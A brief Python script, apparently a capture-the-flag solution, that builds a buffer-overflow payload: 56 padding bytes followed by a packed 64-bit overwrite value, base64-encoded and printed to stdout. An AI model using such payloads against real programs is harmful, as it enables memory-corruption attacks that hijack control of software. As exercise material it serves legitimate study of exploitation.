
import sys
import struct
import base64

buf = b'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'
buf += struct.pack('<Q', 6580737399331211911)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
